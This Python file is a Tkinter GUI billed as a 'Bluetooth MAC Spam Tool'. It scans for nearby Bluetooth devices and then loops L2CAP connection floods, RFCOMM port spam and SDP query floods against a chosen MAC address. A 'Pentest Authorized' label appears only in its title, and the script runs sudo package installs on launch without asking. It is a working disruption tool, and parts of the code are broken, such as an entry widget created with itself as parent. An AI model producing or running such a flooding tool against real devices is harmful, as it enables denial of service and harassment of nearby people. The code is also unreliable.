import bluetooth
import threading
import time
import random
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
from scapy.all import *
import subprocess
import os

class BluetoothSpamTool:
    def __init__(self, root):
        self.root = root
        self.root.title("🔵 Bluetooth MAC Spam Tool - Pentest Authorized")
        self.root.geometry("700x600")
        
        self.target_mac = None
        self.running = False
        self.thread = None
        
        self.setup_ui()
    
    def setup_ui(self):
        # Header
        header = tk.Label(self.root, text="🔵 Bluetooth MAC Target Spam Tool", 
                         font=('Arial', 16, 'bold'), bg='#1e3a8a', fg='white', pady=15)
        header.pack(fill=tk.X)
        
        # MAC Input
        mac_frame = ttk.LabelFrame(self.root, text="🎯 Target MAC Address", padding="20")
        mac_frame.pack(fill=tk.X, padx=20, pady=10)
        
        self.mac_var = tk.StringVar()
        mac_entry = ttk.Entry(mac_entry, textvariable=self.mac_var, font=('Arial', 14), width=25)
        mac_entry.pack(pady=10)
        mac_entry.bind('<Return>', lambda e: self.scan_devices())
        
        # Buttons
        btn_frame = ttk.Frame(self.root)
        btn_frame.pack(pady=20)
        
        ttk.Button(btn_frame, text="🔍 SCAN Nearby Devices", command=self.scan_devices).pack(side=tk.LEFT, padx=10)
        self.spam_btn = ttk.Button(btn_frame, text="💥 START SPAM", command=self.start_spam)
        self.spam_btn.pack(side=tk.LEFT, padx=10)
        ttk.Button(btn_frame, text="🛑 STOP", command=self.stop_spam).pack(side=tk.LEFT, padx=10)
        
        # Status
        self.status_label = tk.Label(self.root, text="Ready - MAC enter karo", font=('Arial', 12))
        self.status_label.pack(pady=10)
        
        # Progress
        self.progress = ttk.Progressbar(self.root, length=400, mode='indeterminate')
        self.progress.pack(pady=10)
        
        # Log
        log_frame = ttk.LabelFrame(self.root, text="📡 Live Spam Log", padding="10")
        log_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=15, state=tk.DISABLED)
        self.log_text.pack(fill=tk.BOTH, expand=True)
    
    def log(self, msg):
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)
        self.root.update()
    
    def scan_devices(self):
        """Scan nearby Bluetooth devices"""
        self.log("🔍 Scanning nearby Bluetooth devices...")
        try:
            devices = bluetooth.discover_devices(duration=8, lookup_names=True)
            if devices:
                self.log("📱 Found devices:")
                for addr, name in devices:
                    self.log(f"   {addr} → {name}")
                    if not self.mac_var.get():
                        self.mac_var.set(addr)
                self.status_label.config(text=f"📡 {len(devices)} devices found")
            else:
                self.log("❌ No devices found")
        except Exception as e:
            self.log(f"❌ Scan error: {e}")
    
    def l2cap_flood(self, target_mac):
        """L2CAP Connection Flood"""
        try:
            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            sock.settimeout(1)
            sock.connect((target_mac, 1))
            sock.send("SPAM_PENTEST_DATA")
            sock.close()
            return True
        except:
            return False
    
    def rfcomm_spam(self, target_mac):
        """RFCOMM Channel Spam"""
        ports = [1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23]
        for port in ports:
            try:
                sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
                sock.connect((target_mac, port))
                sock.send(f"PENTEST_SPAM_PORT_{port}")
                sock.close()
                time.sleep(0.01)
            except:
                pass
        return True
    
    def sdp_query_flood(self, target_mac):
        """SDP Service Discovery Flood"""
        try:
            services = bluetooth.find_service(address=target_mac)
            return True
        except:
            return False
    
    def hcitool_scan(self, target_mac):
        """HCI Inquiry Spam"""
        try:
            subprocess.run(['hcitool', 'scan'], capture_output=True)
            return True
        except:
            return False
    
    def spam_worker(self):
        """Main spam loop"""
        attack_methods = [
            self.l2cap_flood,
            self.rfcomm_spam, 
            self.sdp_query_flood,
            lambda mac: self.l2cap_flood(mac),  # Repeat
        ]
        
        count = 0
        while self.running:
            method = random.choice(attack_methods)
            success = method(self.target_mac)
            
            count += 1
            status = "✅" if success else "⚠️"
            
            self.log(f"{status} Attack #{count} → L2CAP/RFCOMM/SDP Flood")
            time.sleep(random.uniform(0.1, 0.5))  # 2-10/sec
        
        self.log(f"🛑 Spam stopped. Total attacks: {count}")
    
    def start_spam(self):
        mac = self.mac_var.get().strip()
        if not re.match(r'^([0-9A-Fa-f]{2}:?){6}$', mac):
            messagebox.showerror("❌", "Valid MAC format: AA:BB:CC:DD:EE:FF")
            return
        
        self.target_mac = mac
        self.running = True
        self.spam_btn.config(state='disabled')
        self.progress.start()
        self.status_label.config(text=f"💥 Spamming {mac}...", fg='red')
        
        self.thread = threading.Thread(target=self.spam_worker, daemon=True)
        self.thread.start()
    
    def stop_spam(self):
        self.running = False
        self.spam_btn.config(state='normal')
        self.progress.stop()
        self.status_label.config(text="🛑 Stopped", fg='orange')

# Linux hcitool support
def install_bluetooth_tools():
    """Auto install required tools"""
    try:
        subprocess.run(['sudo', 'apt', 'update'], capture_output=True)
        subprocess.run(['sudo', 'apt', 'install', '-y', 'bluez', 'bluetooth'], capture_output=True)
    except:
        pass

if __name__ == "__main__":
    install_bluetooth_tools()
    root = tk.Tk()
    app = BluetoothSpamTool(root)
    root.mainloop()